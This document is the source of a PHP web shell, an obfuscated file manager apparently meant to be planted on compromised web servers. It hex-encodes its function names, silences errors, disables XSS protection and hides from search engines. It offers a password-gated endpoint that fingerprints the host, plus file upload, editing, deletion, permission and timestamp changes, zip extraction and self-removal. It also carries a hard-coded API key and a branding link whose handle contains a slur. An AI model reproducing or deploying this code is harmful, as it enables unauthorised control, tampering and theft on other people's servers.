...
<?php $password="BDKR28";$error="";if(isset($_GET["passwordapi"])&&$_GET["passwordapi"]==$password&&isset($_GET["id"])&&$_GET["id"]=="server"){$reponse=array();$reponse['ok']="1";if($reponse['ok']=="1"){$HTTPS=$_SERVER["HTTP_SSLSESSIONID"]?TRUE:FALSE;if($HTTPS==true){$reponse['https']="1";}else{$reponse['https']="0";}$serverip=$_SERVER['SERVER_ADDR'];$url2="http://api.ipapi.com/api/$serverip?access_key=e9d3de0ed9c3cd55c83a9beb6b652b8a";$headers2=array();$headers2[]='Accept-Version: 3';$ch2=curl_init();curl_setopt($ch2,CURLOPT_URL,$url2);curl_setopt($ch2,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch2,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($ch2,CURLOPT_HTTPHEADER,$headers2);$resp2=curl_exec($ch2);$err2=curl_error($ch2);curl_close($ch2);if($err2){return false;}else{$Json2=json_decode($resp2,true);$country=$Json2['country_name'];if(!empty($country)){$reponse['country']=$country;}else{$reponse['country']=0;}}$phpversion=phpversion();if(!empty($phpversion)){$reponse['phpversion']=$phpversion;}else{$reponse['phpversion']="0";}$serverOs=PHP_OS;if(!empty($serverOs)){$reponse['serveros']=$serverOs;}else{$reponse['serveros']="0";}$machinetype=php_uname('m');if(!empty($machinetype)){$reponse['machinetype']=$machinetype;}else{$reponse['machinetype']="0";}$hostname=gethostname();if(!empty($hostname)){$reponse['hostname']=$hostname;}else{$reponse['hostname']="0";}$url='http://'.$_SERVER['SERVER_NAME'];$tld=end(explode(".",parse_url($url,PHP_URL_HOST)));if(!empty($tld)){$reponse['tld']=$tld;}else{$reponse['tld']="0";}}else{$reponse['ok']="0";}echo json_encode($reponse);exit();}header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors',FALSE);$Array=['7068705f756e616d65','70687076657273696f6e','6368646972','676574637764','707265675f73706c6974','636f7079','66696c655f6765745f636f6e74656e7473','6261736536345f6465636f6465','69735f646972','6f625f656e645f636c65616e28293b','756e6c696e6b','6d6b646972','63686d6f64','7363616e646972','7374725f7265706c616365','68746d6c7370656369616c6368617273','7661725f64756d70','666f70656e','667772697465','66636c6f7365','64617465','66696c656d74696d65','737562737472','737072696e7466','66696c657065726d73','746f756368','66696c655f657869737473','72656e616d65','69735f6172726179','69735f6f626a656374','737472706f73','69735f7772697461626c65','69735f7265616461626c65','737472746f74696d65','66696c6573697a65','726d646972','6f625f6765745f636c65616e','7265616466696c65','617373657274',];$___=count($Array);for($i=0;$i<$___;$i++){$GNJ[]=uhex($Array[$i]);} ?>
...
<!DOCTYPE html>
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				html{
					...
					background-image: url("https://i.gifer.com/QBnX.gif");
		...
		<body>
			<header>
				<div class="y x">
				<img width="580" target="_blank" href="https://t.me/nigga188" onclick="location.href='https://t.me/nigga188';" src="https://media.tenor.com/mmi7qG0zlRsAAAAM/a-great-chaos-trim.gif">
				</div>
			...
			<article>
				<div class="i">
					...
					<?php if(isset($_GET["d"])){$d=uhex($_GET["d"]);$GNJ[2](uhex($_GET["d"]));}else{$d=$GNJ[3]();}$k=$GNJ[4]("/(\\\|\/)/",$d);foreach($k as $m=>$l){if($l==''&&$m==0){echo '<a class="ajx" href="?d=2f">/</a>';}if($l==''){continue;}echo '<a class="ajx" href="?d=';for($i=0;$i<=$m;$i++){echo hex($k[$i]);if($i!=$m){echo '2f';}}echo '">'.$l.'</a>/';} ?>
...
<a onclick="window.location = window.location.pathname;">| HOME</a>
				...
				<div class="u">
					...
					<?php $o_=['<script>$.notify("','", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'];$f=$o_[0].'OK!'.$o_[1];$g=$o_[0].'ER!'.$o_[1];if(isset($_FILES["n"])){$z=$_FILES["n"]["name"];$r=count($z);for($i=0;$i<$r;$i++){if($GNJ[5]($_FILES["n"]["tmp_name"][$i],$z[$i])){echo $f;}else{echo $g;}}} ?>

				</div>
					<?php $a_='<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';$b_='</th>
							</tr>
						...
						<tbody>
							...
							<tr>
								<td class="x">';$c_='</td>
									...
									</form>';if(isset($_GET["s"])){echo $a_.uhex($_GET["s"]).$b_.'
								...
								'.$c_;}elseif(isset($_GET["y"])){echo $a_.'REQUEST'.$b_.'
									<form method="post">
										...
										'.$d_.'
									<br />
									<textarea readonly="yes">';if(isset($_POST["2"])){echo $GNJ[15](dre($_POST["1"],$_POST["2"]));}echo '</textarea>
					...
					<script>
					...
					</script>';if(isset($_POST["e"])){if($_POST["b64"]=="1"){$ex=$GNJ[7]($_POST["e"]);}else{$ex=$_POST["e"];}$fp=$GNJ[17](uhex($_GET["e"]),'w');if($GNJ[18]($fp,$ex)){OK();}else{ER();}$GNJ[19]($fp);}}elseif(isset($_GET["x"])){rec(uhex($_GET["x"]));if($GNJ[26](uhex($_GET["x"]))){ER();}else{OK();}}elseif(isset($_GET["t"])){echo $a_.uhex($_GET["t"]).$b_.'
									<form action="" method="post">
										<input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i",$GNJ[21](uhex($_GET["t"]))).'">
										'.$d_.'
								'.$c_;if(!empty($_POST["t"])){$p=$GNJ[33]($_POST["t"]);if($p){if(!$GNJ[25](uhex($_GET["t"]),$p,$p)){ER();}else{OK();}}else{ER();}}}elseif(isset($_GET["k"])){echo $a_.uhex($_GET["k"]).$b_.'
									<form action="" method="post">
										<input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o',$GNJ[24](uhex($_GET["k"]))),-4).'">
										'.$d_.'
								'.$c_;if(!empty($_POST["b"])){$x=$_POST["b"];$t=0;for($i=strlen($x)-1;$i>=0;--$i)$t+=(int)$x[$i]*pow(8,(strlen($x)-$i-1));if(!$GNJ[12](uhex($_GET["k"]),$t)){ER();}else{OK();}}}elseif(isset($_GET["l"])){echo $a_.'+DIR'.$b_.'
									<form action="" method="post">
										<input name="l" class="x" type="text" value="">
										'.$d_.'
								'.$c_;if(isset($_POST["l"])){if(!$GNJ[11]($_POST["l"])){ER();}else{OK();}}}elseif(isset($_GET["q"])){if($GNJ[10](__FILE__)){$GNJ[38]($GNJ[9]);header("Location: ".basename($_SERVER['PHP_SELF'])."");exit();}else{echo $g;}}elseif(isset($_GET["n"])){echo $a_.'+FILE'.$b_.'
									<form action="" method="post">
										<input name="n" class="x" type="text" value="">
										'.$d_.'
								'.$c_;if(isset($_POST["n"])){if(!$GNJ[25]($_POST["n"])){ER();}else{OK();}}}elseif(isset($_GET["r"])){echo $a_.uhex($_GET["r"]).$b_.'
									<form action="" method="post">
										<input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">
										'.$d_.'
								'.$c_;if(isset($_POST["r"])){if($GNJ[26]($_POST["r"])){ER();}else{if($GNJ[27](uhex($_GET["r"]),$_POST["r"])){OK();}else{ER();}}}}elseif(isset($_GET["z"])){$zip=new ZipArchive;$res=$zip->open(uhex($_GET["z"]));if($res===TRUE){$zip->extractTo(uhex($_GET["d"]));$zip->close();OK();}else{ER();}}else{echo '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th width="44%">[ NAME ]</th>
								<th width="11%">[ SIZE ]</th>
						...
						';$h="";$j="";$w=$GNJ[13]($d);if($GNJ[28]($w)||$GNJ[29]($w)){foreach($w as $c){$e=$GNJ[14]("\\","/",$d);if(!$GNJ[30]($c,".zip")){$zi='';}else{$zi='<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';}if($GNJ[31]("$d/$c")){$o="";}elseif(!$GNJ[32]("$d/$c")){$o=" h";}else{$o=" w";}$s=$GNJ[34]("$d/$c")/1024;$s=round($s,3);if($s>=1024){$s=round($s/1024,2)." MB";}else{$s=$s." KB";}if(($c!=".")&&($c!="..")){($GNJ[8]("$d/$c"))?$h.='<tr class="r">
							<td>
			...
			<?php if(isset($_GET["1"])){echo $f;}elseif(isset($_GET["0"])){echo $g;}else{NULL;} ?>
